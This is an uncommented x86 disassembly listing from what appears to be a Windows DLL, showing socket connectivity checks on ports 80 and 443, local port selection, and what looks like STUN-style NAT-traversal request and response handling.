1000aaad:	ff 15 48 e2 00 10    	call   *0x1000e248
1000aab3:	6a 10                	push   $0x10
1000aab5:	8b f8                	mov    %eax,%edi
1000aab7:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000aaba:	6a 00                	push   $0x0
1000aabc:	50                   	push   %eax
1000aabd:	e8 68 32 00 00       	call   0x1000dd2a
1000aac2:	83 c4 0c             	add    $0xc,%esp
1000aac5:	6a 02                	push   $0x2
1000aac7:	58                   	pop    %eax
1000aac8:	6a 50                	push   $0x50
1000aaca:	89 75 f4             	mov    %esi,-0xc(%ebp)
1000aacd:	66 89 45 f0          	mov    %ax,-0x10(%ebp)
1000aad1:	ff 15 70 e2 00 10    	call   *0x1000e270
1000aad7:	66 89 45 f2          	mov    %ax,-0xe(%ebp)
1000aadb:	6a 10                	push   $0x10
1000aadd:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000aae0:	50                   	push   %eax
1000aae1:	57                   	push   %edi
1000aae2:	ff 15 88 e2 00 10    	call   *0x1000e288
1000aae8:	57                   	push   %edi
1000aae9:	8b f0                	mov    %eax,%esi
1000aaeb:	ff 15 84 e2 00 10    	call   *0x1000e284
1000aaf1:	85 f6                	test   %esi,%esi
1000aaf3:	74 11                	je     0x1000ab06
1000aaf5:	8d 45 d8             	lea    -0x28(%ebp),%eax
1000aaf8:	43                   	inc    %ebx
1000aaf9:	e8 a0 f8 ff ff       	call   0x1000a39e
1000aafe:	3b d8                	cmp    %eax,%ebx
1000ab00:	72 89                	jb     0x1000aa8b
1000ab02:	33 f6                	xor    %esi,%esi
1000ab04:	eb 03                	jmp    0x1000ab09
1000ab06:	33 f6                	xor    %esi,%esi
1000ab08:	46                   	inc    %esi
1000ab09:	8d 4d d8             	lea    -0x28(%ebp),%ecx
1000ab0c:	e8 f9 f7 ff ff       	call   0x1000a30a
1000ab11:	8b c6                	mov    %esi,%eax
1000ab13:	e9 49 ff ff ff       	jmp    0x1000aa61
1000ab18:	55                   	push   %ebp
1000ab19:	8b ec                	mov    %esp,%ebp
1000ab1b:	83 ec 14             	sub    $0x14,%esp
1000ab1e:	56                   	push   %esi
1000ab1f:	57                   	push   %edi
1000ab20:	ff 75 08             	pushl  0x8(%ebp)
1000ab23:	ff 15 54 e2 00 10    	call   *0x1000e254
1000ab29:	8b f0                	mov    %eax,%esi
1000ab2b:	85 f6                	test   %esi,%esi
1000ab2d:	74 5b                	je     0x1000ab8a
1000ab2f:	83 fe ff             	cmp    $0xffffffff,%esi
1000ab32:	74 56                	je     0x1000ab8a
1000ab34:	6a 00                	push   $0x0
1000ab36:	6a 01                	push   $0x1
1000ab38:	6a 02                	push   $0x2
1000ab3a:	ff 15 48 e2 00 10    	call   *0x1000e248
1000ab40:	6a 10                	push   $0x10
1000ab42:	8b f8                	mov    %eax,%edi
1000ab44:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000ab47:	6a 00                	push   $0x0
1000ab49:	50                   	push   %eax
1000ab4a:	e8 db 31 00 00       	call   0x1000dd2a
1000ab4f:	83 c4 0c             	add    $0xc,%esp
1000ab52:	6a 02                	push   $0x2
1000ab54:	58                   	pop    %eax
1000ab55:	68 bb 01 00 00       	push   $0x1bb
1000ab5a:	89 75 f0             	mov    %esi,-0x10(%ebp)
1000ab5d:	66 89 45 ec          	mov    %ax,-0x14(%ebp)
1000ab61:	ff 15 70 e2 00 10    	call   *0x1000e270
1000ab67:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
1000ab6b:	6a 10                	push   $0x10
1000ab6d:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000ab70:	50                   	push   %eax
1000ab71:	57                   	push   %edi
1000ab72:	ff 15 88 e2 00 10    	call   *0x1000e288
1000ab78:	57                   	push   %edi
1000ab79:	8b f0                	mov    %eax,%esi
1000ab7b:	ff 15 84 e2 00 10    	call   *0x1000e284
1000ab81:	33 c0                	xor    %eax,%eax
1000ab83:	85 f6                	test   %esi,%esi
1000ab85:	0f 94 c0             	sete   %al
1000ab88:	eb 02                	jmp    0x1000ab8c
1000ab8a:	33 c0                	xor    %eax,%eax
1000ab8c:	5f                   	pop    %edi
1000ab8d:	5e                   	pop    %esi
1000ab8e:	c9                   	leave  
1000ab8f:	c3                   	ret    
1000ab90:	51                   	push   %ecx
1000ab91:	56                   	push   %esi
1000ab92:	57                   	push   %edi
1000ab93:	e8 80 ae ff ff       	call   0x10005a18
1000ab98:	8b 35 70 e2 00 10    	mov    0x1000e270,%esi
1000ab9e:	0f b7 c0             	movzwl %ax,%eax
1000aba1:	50                   	push   %eax
1000aba2:	ff d6                	call   *%esi
1000aba4:	0f b7 c0             	movzwl %ax,%eax
1000aba7:	50                   	push   %eax
1000aba8:	e8 6f fc ff ff       	call   0x1000a81c
1000abad:	59                   	pop    %ecx
1000abae:	83 f8 ff             	cmp    $0xffffffff,%eax
1000abb1:	75 49                	jne    0x1000abfc
1000abb3:	33 ff                	xor    %edi,%edi
1000abb5:	83 f8 ff             	cmp    $0xffffffff,%eax
1000abb8:	75 42                	jne    0x1000abfc
1000abba:	e8 59 ae ff ff       	call   0x10005a18
1000abbf:	0f b7 c0             	movzwl %ax,%eax
1000abc2:	50                   	push   %eax
1000abc3:	ff d6                	call   *%esi
1000abc5:	0f b7 c0             	movzwl %ax,%eax
1000abc8:	50                   	push   %eax
1000abc9:	e8 4e fc ff ff       	call   0x1000a81c
1000abce:	47                   	inc    %edi
1000abcf:	59                   	pop    %ecx
1000abd0:	83 ff 05             	cmp    $0x5,%edi
1000abd3:	7c e0                	jl     0x1000abb5
1000abd5:	83 f8 ff             	cmp    $0xffffffff,%eax
1000abd8:	75 22                	jne    0x1000abfc
1000abda:	bf 00 04 00 00       	mov    $0x400,%edi
1000abdf:	83 f8 ff             	cmp    $0xffffffff,%eax
1000abe2:	75 18                	jne    0x1000abfc
1000abe4:	57                   	push   %edi
1000abe5:	ff d6                	call   *%esi
1000abe7:	0f b7 c0             	movzwl %ax,%eax
1000abea:	50                   	push   %eax
1000abeb:	e8 2c fc ff ff       	call   0x1000a81c
1000abf0:	59                   	pop    %ecx
1000abf1:	47                   	inc    %edi
1000abf2:	b9 fa ff 00 00       	mov    $0xfffa,%ecx
1000abf7:	66 3b f9             	cmp    %cx,%di
1000abfa:	72 e3                	jb     0x1000abdf
1000abfc:	5f                   	pop    %edi
1000abfd:	5e                   	pop    %esi
1000abfe:	59                   	pop    %ecx
1000abff:	c3                   	ret    
1000ac00:	33 c9                	xor    %ecx,%ecx
1000ac02:	33 d2                	xor    %edx,%edx
1000ac04:	89 08                	mov    %ecx,(%eax)
1000ac06:	89 48 04             	mov    %ecx,0x4(%eax)
1000ac09:	89 48 08             	mov    %ecx,0x8(%eax)
1000ac0c:	66 89 50 0c          	mov    %dx,0xc(%eax)
1000ac10:	89 48 10             	mov    %ecx,0x10(%eax)
1000ac13:	66 89 48 14          	mov    %cx,0x14(%eax)
1000ac17:	c7 40 18 06 00 00 00 	movl   $0x6,0x18(%eax)
1000ac1e:	c3                   	ret    
1000ac1f:	89 08                	mov    %ecx,(%eax)
1000ac21:	c3                   	ret    
1000ac22:	55                   	push   %ebp
1000ac23:	8b ec                	mov    %esp,%ebp
1000ac25:	89 48 08             	mov    %ecx,0x8(%eax)
1000ac28:	66 8b 4d 08          	mov    0x8(%ebp),%cx
1000ac2c:	66 89 48 0c          	mov    %cx,0xc(%eax)
1000ac30:	5d                   	pop    %ebp
1000ac31:	c2 04 00             	ret    $0x4
1000ac34:	55                   	push   %ebp
1000ac35:	8b ec                	mov    %esp,%ebp
1000ac37:	51                   	push   %ecx
1000ac38:	56                   	push   %esi
1000ac39:	57                   	push   %edi
1000ac3a:	53                   	push   %ebx
1000ac3b:	c7 45 fc 96 0d 00 00 	movl   $0xd96,-0x4(%ebp)
1000ac42:	ff 15 6c e0 00 10    	call   *0x1000e06c
1000ac48:	33 c9                	xor    %ecx,%ecx
1000ac4a:	85 c0                	test   %eax,%eax
1000ac4c:	0f 8e ae 00 00 00    	jle    0x1000ad00
1000ac52:	66 83 3c 4b 3a       	cmpw   $0x3a,(%ebx,%ecx,2)
1000ac57:	74 05                	je     0x1000ac5e
1000ac59:	41                   	inc    %ecx
1000ac5a:	3b c8                	cmp    %eax,%ecx
1000ac5c:	7c f4                	jl     0x1000ac52
1000ac5e:	83 f9 03             	cmp    $0x3,%ecx
1000ac61:	0f 8c 99 00 00 00    	jl     0x1000ad00
1000ac67:	3b c8                	cmp    %eax,%ecx
1000ac69:	74 59                	je     0x1000acc4
1000ac6b:	8d 34 09             	lea    (%ecx,%ecx,1),%esi
1000ac6e:	8d 44 1e 02          	lea    0x2(%esi,%ebx,1),%eax
1000ac72:	50                   	push   %eax
1000ac73:	ff 15 94 e1 00 10    	call   *0x1000e194
1000ac79:	0f b7 c0             	movzwl %ax,%eax
1000ac7c:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000ac7f:	66 85 c0             	test   %ax,%ax
1000ac82:	74 7c                	je     0x1000ad00
1000ac84:	8d 46 02             	lea    0x2(%esi),%eax
1000ac87:	50                   	push   %eax
1000ac88:	e8 57 bd ff ff       	call   0x100069e4
1000ac8d:	8b f8                	mov    %eax,%edi
1000ac8f:	59                   	pop    %ecx
1000ac90:	85 ff                	test   %edi,%edi
1000ac92:	74 6c                	je     0x1000ad00
1000ac94:	56                   	push   %esi
1000ac95:	53                   	push   %ebx
1000ac96:	57                   	push   %edi
1000ac97:	e8 74 30 00 00       	call   0x1000dd10
1000ac9c:	83 c4 0c             	add    $0xc,%esp
1000ac9f:	33 c0                	xor    %eax,%eax
1000aca1:	57                   	push   %edi
1000aca2:	66 89 04 3e          	mov    %ax,(%esi,%edi,1)
1000aca6:	e8 71 ac ff ff       	call   0x1000591c
1000acab:	8b f0                	mov    %eax,%esi
1000acad:	59                   	pop    %ecx
1000acae:	83 fe ff             	cmp    $0xffffffff,%esi
1000acb1:	75 09                	jne    0x1000acbc
1000acb3:	57                   	push   %edi
1000acb4:	e8 cf ac ff ff       	call   0x10005988
1000acb9:	59                   	pop    %ecx
1000acba:	8b f0                	mov    %eax,%esi
1000acbc:	57                   	push   %edi
1000acbd:	e8 51 bd ff ff       	call   0x10006a13
1000acc2:	eb 16                	jmp    0x1000acda
1000acc4:	53                   	push   %ebx
1000acc5:	e8 52 ac ff ff       	call   0x1000591c
1000acca:	8b f0                	mov    %eax,%esi
1000accc:	59                   	pop    %ecx
1000accd:	83 fe ff             	cmp    $0xffffffff,%esi
1000acd0:	75 09                	jne    0x1000acdb
1000acd2:	53                   	push   %ebx
1000acd3:	e8 b0 ac ff ff       	call   0x10005988
1000acd8:	8b f0                	mov    %eax,%esi
1000acda:	59                   	pop    %ecx
1000acdb:	85 f6                	test   %esi,%esi
1000acdd:	74 21                	je     0x1000ad00
1000acdf:	83 fe ff             	cmp    $0xffffffff,%esi
1000ace2:	74 1c                	je     0x1000ad00
1000ace4:	ff 75 fc             	pushl  -0x4(%ebp)
1000ace7:	ff 15 70 e2 00 10    	call   *0x1000e270
1000aced:	0f b7 c0             	movzwl %ax,%eax
1000acf0:	50                   	push   %eax
1000acf1:	8b 45 08             	mov    0x8(%ebp),%eax
1000acf4:	8b ce                	mov    %esi,%ecx
1000acf6:	e8 27 ff ff ff       	call   0x1000ac22
1000acfb:	33 c0                	xor    %eax,%eax
1000acfd:	40                   	inc    %eax
1000acfe:	eb 02                	jmp    0x1000ad02
1000ad00:	33 c0                	xor    %eax,%eax
1000ad02:	5f                   	pop    %edi
1000ad03:	5e                   	pop    %esi
1000ad04:	c9                   	leave  
1000ad05:	c2 04 00             	ret    $0x4
1000ad08:	8b 40 10             	mov    0x10(%eax),%eax
1000ad0b:	c3                   	ret    
1000ad0c:	3d 40 06 00 00       	cmp    $0x640,%eax
1000ad11:	76 06                	jbe    0x1000ad19
1000ad13:	05 40 06 00 00       	add    $0x640,%eax
1000ad18:	c3                   	ret    
1000ad19:	8d 44 00 64          	lea    0x64(%eax,%eax,1),%eax
1000ad1d:	c3                   	ret    
1000ad1e:	55                   	push   %ebp
1000ad1f:	8b ec                	mov    %esp,%ebp
1000ad21:	53                   	push   %ebx
1000ad22:	56                   	push   %esi
1000ad23:	8b d8                	mov    %eax,%ebx
1000ad25:	57                   	push   %edi
1000ad26:	8b f1                	mov    %ecx,%esi
1000ad28:	83 fb 04             	cmp    $0x4,%ebx
1000ad2b:	76 33                	jbe    0x1000ad60
1000ad2d:	8b 3d 28 e2 00 10    	mov    0x1000e228,%edi
1000ad33:	0f b7 46 02          	movzwl 0x2(%esi),%eax
1000ad37:	50                   	push   %eax
1000ad38:	ff d7                	call   *%edi
1000ad3a:	0f b7 c0             	movzwl %ax,%eax
1000ad3d:	3b c3                	cmp    %ebx,%eax
1000ad3f:	77 1f                	ja     0x1000ad60
1000ad41:	66 8b 06             	mov    (%esi),%ax
1000ad44:	66 3b 45 08          	cmp    0x8(%ebp),%ax
1000ad48:	74 1d                	je     0x1000ad67
1000ad4a:	0f b7 46 02          	movzwl 0x2(%esi),%eax
1000ad4e:	50                   	push   %eax
1000ad4f:	ff d7                	call   *%edi
1000ad51:	0f b7 c0             	movzwl %ax,%eax
1000ad54:	83 c0 04             	add    $0x4,%eax
1000ad57:	2b d8                	sub    %eax,%ebx
1000ad59:	03 f0                	add    %eax,%esi
1000ad5b:	83 fb 04             	cmp    $0x4,%ebx
1000ad5e:	77 d3                	ja     0x1000ad33
1000ad60:	33 c0                	xor    %eax,%eax
1000ad62:	5f                   	pop    %edi
1000ad63:	5e                   	pop    %esi
1000ad64:	5b                   	pop    %ebx
1000ad65:	5d                   	pop    %ebp
1000ad66:	c3                   	ret    
1000ad67:	8b c6                	mov    %esi,%eax
1000ad69:	eb f7                	jmp    0x1000ad62
1000ad6b:	55                   	push   %ebp
1000ad6c:	8b ec                	mov    %esp,%ebp
1000ad6e:	ff 75 08             	pushl  0x8(%ebp)
1000ad71:	ff 15 70 e2 00 10    	call   *0x1000e270
1000ad77:	0f b7 c0             	movzwl %ax,%eax
1000ad7a:	50                   	push   %eax
1000ad7b:	0f b7 46 02          	movzwl 0x2(%esi),%eax
1000ad7f:	50                   	push   %eax
1000ad80:	ff 15 28 e2 00 10    	call   *0x1000e228
1000ad86:	0f b7 c0             	movzwl %ax,%eax
1000ad89:	8d 4e 14             	lea    0x14(%esi),%ecx
1000ad8c:	e8 8d ff ff ff       	call   0x1000ad1e
1000ad91:	59                   	pop    %ecx
1000ad92:	5d                   	pop    %ebp
1000ad93:	c3                   	ret    
1000ad94:	55                   	push   %ebp
1000ad95:	8b ec                	mov    %esp,%ebp
1000ad97:	83 ec 14             	sub    $0x14,%esp
1000ad9a:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000ad9d:	50                   	push   %eax
1000ad9e:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000ada1:	50                   	push   %eax
1000ada2:	ff 75 08             	pushl  0x8(%ebp)
1000ada5:	c7 45 fc 10 00 00 00 	movl   $0x10,-0x4(%ebp)
1000adac:	ff 15 44 e2 00 10    	call   *0x1000e244
1000adb2:	85 c0                	test   %eax,%eax
1000adb4:	75 06                	jne    0x1000adbc
1000adb6:	66 8b 45 ee          	mov    -0x12(%ebp),%ax
1000adba:	c9                   	leave  
1000adbb:	c3                   	ret    
1000adbc:	33 c0                	xor    %eax,%eax
1000adbe:	c9                   	leave  
1000adbf:	c3                   	ret    
1000adc0:	55                   	push   %ebp
1000adc1:	8b ec                	mov    %esp,%ebp
1000adc3:	51                   	push   %ecx
1000adc4:	51                   	push   %ecx
1000adc5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000adc9:	56                   	push   %esi
1000adca:	57                   	push   %edi
1000adcb:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000adce:	50                   	push   %eax
1000adcf:	8b 45 08             	mov    0x8(%ebp),%eax
1000add2:	8b 30                	mov    (%eax),%esi
1000add4:	8d 7d fc             	lea    -0x4(%ebp),%edi
1000add7:	e8 a8 fb ff ff       	call   0x1000a984
1000addc:	59                   	pop    %ecx
1000addd:	85 c0                	test   %eax,%eax
1000addf:	74 ea                	je     0x1000adcb
1000ade1:	5f                   	pop    %edi
1000ade2:	5e                   	pop    %esi
1000ade3:	c9                   	leave  
1000ade4:	c2 04 00             	ret    $0x4
1000ade7:	6a 01                	push   $0x1
1000ade9:	e8 7d ff ff ff       	call   0x1000ad6b
1000adee:	59                   	pop    %ecx
1000adef:	85 c0                	test   %eax,%eax
1000adf1:	74 04                	je     0x1000adf7
1000adf3:	8b 40 08             	mov    0x8(%eax),%eax
1000adf6:	c3                   	ret    
1000adf7:	33 c0                	xor    %eax,%eax
1000adf9:	c3                   	ret    
1000adfa:	55                   	push   %ebp
1000adfb:	8b ec                	mov    %esp,%ebp
1000adfd:	83 ec 24             	sub    $0x24,%esp
1000ae00:	56                   	push   %esi
1000ae01:	57                   	push   %edi
1000ae02:	8b f8                	mov    %eax,%edi
1000ae04:	33 f6                	xor    %esi,%esi
1000ae06:	3b fe                	cmp    %esi,%edi
1000ae08:	0f 84 59 01 00 00    	je     0x1000af67
1000ae0e:	3b de                	cmp    %esi,%ebx
1000ae10:	0f 84 51 01 00 00    	je     0x1000af67
1000ae16:	39 75 18             	cmp    %esi,0x18(%ebp)
1000ae19:	0f 84 48 01 00 00    	je     0x1000af67
1000ae1f:	8b 45 08             	mov    0x8(%ebp),%eax
1000ae22:	8b 40 18             	mov    0x18(%eax),%eax
1000ae25:	c7 45 f8 64 00 00 00 	movl   $0x64,-0x8(%ebp)
1000ae2c:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000ae2f:	ff 15 40 e1 00 10    	call   *0x1000e140
1000ae35:	8b d0                	mov    %eax,%edx
1000ae37:	d1 ea                	shr    %edx
1000ae39:	8b c8                	mov    %eax,%ecx
1000ae3b:	f7 d2                	not    %edx
1000ae3d:	c1 e1 08             	shl    $0x8,%ecx
1000ae40:	33 ca                	xor    %edx,%ecx
1000ae42:	89 4b 0c             	mov    %ecx,0xc(%ebx)
1000ae45:	33 c8                	xor    %eax,%ecx
1000ae47:	89 43 04             	mov    %eax,0x4(%ebx)
1000ae4a:	89 53 08             	mov    %edx,0x8(%ebx)
1000ae4d:	89 4b 10             	mov    %ecx,0x10(%ebx)
1000ae50:	c7 45 ec 10 00 00 00 	movl   $0x10,-0x14(%ebp)
1000ae57:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
1000ae5b:	0f 84 f7 00 00 00    	je     0x1000af58
1000ae61:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000ae64:	ff 4d f4             	decl   -0xc(%ebp)
1000ae67:	e8 a0 fe ff ff       	call   0x1000ad0c
1000ae6c:	ff 75 10             	pushl  0x10(%ebp)
1000ae6f:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000ae72:	ff 75 0c             	pushl  0xc(%ebp)
1000ae75:	8b 45 08             	mov    0x8(%ebp),%eax
1000ae78:	ff 75 14             	pushl  0x14(%ebp)
1000ae7b:	53                   	push   %ebx
1000ae7c:	ff 30                	pushl  (%eax)
1000ae7e:	e8 2e fa ff ff       	call   0x1000a8b1
1000ae83:	83 c4 14             	add    $0x14,%esp
1000ae86:	85 c0                	test   %eax,%eax
1000ae88:	0f 84 ce 00 00 00    	je     0x1000af5c
1000ae8e:	be 02 01 00 00       	mov    $0x102,%esi
1000ae93:	ff 15 40 e1 00 10    	call   *0x1000e140
1000ae99:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
1000ae9d:	8b c8                	mov    %eax,%ecx
1000ae9f:	89 4d f0             	mov    %ecx,-0x10(%ebp)
1000aea2:	76 b3                	jbe    0x1000ae57
1000aea4:	8b 45 f0             	mov    -0x10(%ebp),%eax
1000aea7:	2b c1                	sub    %ecx,%eax
1000aea9:	03 45 f8             	add    -0x8(%ebp),%eax
1000aeac:	8d 4d ec             	lea    -0x14(%ebp),%ecx
1000aeaf:	51                   	push   %ecx
1000aeb0:	8d 4d dc             	lea    -0x24(%ebp),%ecx
1000aeb3:	51                   	push   %ecx
1000aeb4:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000aeb7:	8b 31                	mov    (%ecx),%esi
1000aeb9:	68 80 00 00 00       	push   $0x80
1000aebe:	ff 75 18             	pushl  0x18(%ebp)
1000aec1:	e8 34 fa ff ff       	call   0x1000a8fa
1000aec6:	8b f0                	mov    %eax,%esi
1000aec8:	83 c4 10             	add    $0x10,%esp
1000aecb:	85 f6                	test   %esi,%esi
1000aecd:	75 69                	jne    0x1000af38
1000aecf:	8b 45 1c             	mov    0x1c(%ebp),%eax
1000aed2:	85 c0                	test   %eax,%eax
1000aed4:	74 05                	je     0x1000aedb
1000aed6:	3b 45 e0             	cmp    -0x20(%ebp),%eax
1000aed9:	75 58                	jne    0x1000af33
1000aedb:	66 8b 45 20          	mov    0x20(%ebp),%ax
1000aedf:	66 85 c0             	test   %ax,%ax
1000aee2:	74 06                	je     0x1000aeea
1000aee4:	66 3b 45 de          	cmp    -0x22(%ebp),%ax
1000aee8:	75 49                	jne    0x1000af33
1000aeea:	83 3f 14             	cmpl   $0x14,(%edi)
1000aeed:	72 44                	jb     0x1000af33
1000aeef:	68 01 01 00 00       	push   $0x101
1000aef4:	ff 15 70 e2 00 10    	call   *0x1000e270
1000aefa:	8b 4d 18             	mov    0x18(%ebp),%ecx
1000aefd:	66 39 01             	cmp    %ax,(%ecx)
1000af00:	75 31                	jne    0x1000af33
1000af02:	8b 41 04             	mov    0x4(%ecx),%eax
1000af05:	3b 43 04             	cmp    0x4(%ebx),%eax
1000af08:	75 29                	jne    0x1000af33
1000af0a:	8b 41 08             	mov    0x8(%ecx),%eax
1000af0d:	3b 43 08             	cmp    0x8(%ebx),%eax
1000af10:	75 21                	jne    0x1000af33
1000af12:	8b 41 0c             	mov    0xc(%ecx),%eax
1000af15:	3b 43 0c             	cmp    0xc(%ebx),%eax
1000af18:	75 19                	jne    0x1000af33
1000af1a:	8b 41 10             	mov    0x10(%ecx),%eax
1000af1d:	3b 43 10             	cmp    0x10(%ebx),%eax
1000af20:	75 11                	jne    0x1000af33
1000af22:	0f b7 41 02          	movzwl 0x2(%ecx),%eax
1000af26:	50                   	push   %eax
1000af27:	ff 15 28 e2 00 10    	call   *0x1000e228
1000af2d:	66 83 f8 0c          	cmp    $0xc,%ax
1000af31:	73 30                	jae    0x1000af63
1000af33:	be 02 01 00 00       	mov    $0x102,%esi
1000af38:	ff 15 40 e1 00 10    	call   *0x1000e140
1000af3e:	8b c8                	mov    %eax,%ecx
1000af40:	2b 45 f0             	sub    -0x10(%ebp),%eax
1000af43:	3b 45 f8             	cmp    -0x8(%ebp),%eax
1000af46:	0f 82 58 ff ff ff    	jb     0x1000aea4
1000af4c:	81 fe 02 01 00 00    	cmp    $0x102,%esi
1000af52:	0f 84 ff fe ff ff    	je     0x1000ae57
1000af58:	8b c6                	mov    %esi,%eax
1000af5a:	eb 0e                	jmp    0x1000af6a
1000af5c:	b8 4f 05 00 00       	mov    $0x54f,%eax
1000af61:	eb 07                	jmp    0x1000af6a
1000af63:	33 c0                	xor    %eax,%eax
1000af65:	eb 03                	jmp    0x1000af6a
1000af67:	6a 57                	push   $0x57
1000af69:	58                   	pop    %eax
1000af6a:	5f                   	pop    %edi
1000af6b:	5e                   	pop    %esi
1000af6c:	c9                   	leave  
1000af6d:	c2 1c 00             	ret    $0x1c
1000af70:	55                   	push   %ebp
1000af71:	8b ec                	mov    %esp,%ebp
1000af73:	81 ec 04 01 00 00    	sub    $0x104,%esp
1000af79:	53                   	push   %ebx
1000af7a:	56                   	push   %esi
1000af7b:	8b 75 08             	mov    0x8(%ebp),%esi
1000af7e:	33 c0                	xor    %eax,%eax
1000af80:	57                   	push   %edi
1000af81:	89 46 04             	mov    %eax,0x4(%esi)
1000af84:	39 06                	cmp    %eax,(%esi)
1000af86:	75 08                	jne    0x1000af90
1000af88:	6a 57                	push   $0x57
1000af8a:	58                   	pop    %eax
1000af8b:	e9 67 03 00 00       	jmp    0x1000b2f7
1000af90:	8b 3d 70 e2 00 10    	mov    0x1000e270,%edi
1000af96:	6a 01                	push   $0x1
1000af98:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000af9b:	ff d7                	call   *%edi
1000af9d:	8b 4e 08             	mov    0x8(%esi),%ecx
1000afa0:	66 89 45 c4          	mov    %ax,-0x3c(%ebp)
1000afa4:	33 c0                	xor    %eax,%eax
1000afa6:	66 89 45 c6          	mov    %ax,-0x3a(%ebp)
1000afaa:	0f b7 46 0c          	movzwl 0xc(%esi),%eax
1000afae:	50                   	push   %eax
1000afaf:	51                   	push   %ecx
1000afb0:	8d 95 40 ff ff ff    	lea    -0xc0(%ebp),%edx
1000afb6:	52                   	push   %edx
1000afb7:	6a 14                	push   $0x14
1000afb9:	50                   	push   %eax
1000afba:	51                   	push   %ecx
1000afbb:	56                   	push   %esi
1000afbc:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000afbf:	8d 5d c4             	lea    -0x3c(%ebp),%ebx
1000afc2:	e8 33 fe ff ff       	call   0x1000adfa
1000afc7:	85 c0                	test   %eax,%eax
1000afc9:	0f 85 23 03 00 00    	jne    0x1000b2f2
1000afcf:	6a 01                	push   $0x1
1000afd1:	8d b5 40 ff ff ff    	lea    -0xc0(%ebp),%esi
1000afd7:	e8 8f fd ff ff       	call   0x1000ad6b
1000afdc:	8b f0                	mov    %eax,%esi
1000afde:	59                   	pop    %ecx
1000afdf:	85 f6                	test   %esi,%esi
1000afe1:	75 04                	jne    0x1000afe7
1000afe3:	6a 0d                	push   $0xd
1000afe5:	eb a3                	jmp    0x1000af8a
1000afe7:	0f b7 46 02          	movzwl 0x2(%esi),%eax
1000afeb:	50                   	push   %eax
1000afec:	ff 15 28 e2 00 10    	call   *0x1000e228
1000aff2:	66 83 f8 08          	cmp    $0x8,%ax
1000aff6:	72 eb                	jb     0x1000afe3
1000aff8:	80 7e 05 01          	cmpb   $0x1,0x5(%esi)
1000affc:	74 0a                	je     0x1000b008
1000affe:	b8 0c 07 00 00       	mov    $0x70c,%eax
1000b003:	e9 ef 02 00 00       	jmp    0x1000b2f7
1000b008:	0f b7 46 06          	movzwl 0x6(%esi),%eax
1000b00c:	8b 5d 08             	mov    0x8(%ebp),%ebx
1000b00f:	66 89 43 14          	mov    %ax,0x14(%ebx)
1000b013:	66 85 c0             	test   %ax,%ax
1000b016:	74 cb                	je     0x1000afe3
1000b018:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
1000b01c:	8b 46 08             	mov    0x8(%esi),%eax
1000b01f:	89 43 10             	mov    %eax,0x10(%ebx)
1000b022:	74 0e                	je     0x1000b032
1000b024:	c7 43 04 63 00 00 00 	movl   $0x63,0x4(%ebx)
1000b02b:	33 c0                	xor    %eax,%eax
1000b02d:	e9 c5 02 00 00       	jmp    0x1000b2f7
1000b032:	6a 05                	push   $0x5
1000b034:	8d b5 40 ff ff ff    	lea    -0xc0(%ebp),%esi
1000b03a:	e8 2c fd ff ff       	call   0x1000ad6b
1000b03f:	59                   	pop    %ecx
1000b040:	85 c0                	test   %eax,%eax
1000b042:	75 0f                	jne    0x1000b053
1000b044:	68 2c 80 00 00       	push   $0x802c
1000b049:	e8 1d fd ff ff       	call   0x1000ad6b
1000b04e:	59                   	pop    %ecx
1000b04f:	85 c0                	test   %eax,%eax
1000b051:	74 d1                	je     0x1000b024
1000b053:	8b 48 08             	mov    0x8(%eax),%ecx
1000b056:	0f b7 40 06          	movzwl 0x6(%eax),%eax
1000b05a:	68 2c 01 00 00       	push   $0x12c
1000b05f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
1000b062:	89 45 0c             	mov    %eax,0xc(%ebp)
1000b065:	ff 15 44 e1 00 10    	call   *0x1000e144
1000b06b:	53                   	push   %ebx
1000b06c:	e8 4f fd ff ff       	call   0x1000adc0
1000b071:	ff 33                	pushl  (%ebx)
1000b073:	c7 45 f4 10 00 00 00 	movl   $0x10,-0xc(%ebp)
1000b07a:	e8 15 fd ff ff       	call   0x1000ad94
1000b07f:	0f b7 c0             	movzwl %ax,%eax
1000b082:	59                   	pop    %ecx
1000b083:	66 39 43 14          	cmp    %ax,0x14(%ebx)
1000b087:	75 3e                	jne    0x1000b0c7
1000b089:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
1000b08f:	50                   	push   %eax
1000b090:	8d 7d f4             	lea    -0xc(%ebp),%edi
1000b093:	e8 13 f9 ff ff       	call   0x1000a9ab
1000b098:	59                   	pop    %ecx
1000b099:	85 c0                	test   %eax,%eax
1000b09b:	74 05                	je     0x1000b0a2
1000b09d:	83 f8 7a             	cmp    $0x7a,%eax
1000b0a0:	75 1f                	jne    0x1000b0c1
1000b0a2:	33 c0                	xor    %eax,%eax
1000b0a4:	39 45 f4             	cmp    %eax,-0xc(%ebp)
1000b0a7:	76 18                	jbe    0x1000b0c1
1000b0a9:	8b f3                	mov    %ebx,%esi
1000b0ab:	8b 4e 10             	mov    0x10(%esi),%ecx
1000b0ae:	39 8c 85 00 ff ff ff 	cmp    %ecx,-0x100(%ebp,%eax,4)
1000b0b5:	0f 84 81 00 00 00    	je     0x1000b13c
1000b0bb:	40                   	inc    %eax
1000b0bc:	3b 45 f4             	cmp    -0xc(%ebp),%eax
1000b0bf:	72 ed                	jb     0x1000b0ae
1000b0c1:	8b 3d 70 e2 00 10    	mov    0x1000e270,%edi
1000b0c7:	6a 03                	push   $0x3
1000b0c9:	ff d7                	call   *%edi
1000b0cb:	6a 04                	push   $0x4
1000b0cd:	66 89 45 ec          	mov    %ax,-0x14(%ebp)
1000b0d1:	ff d7                	call   *%edi
1000b0d3:	6a 01                	push   $0x1
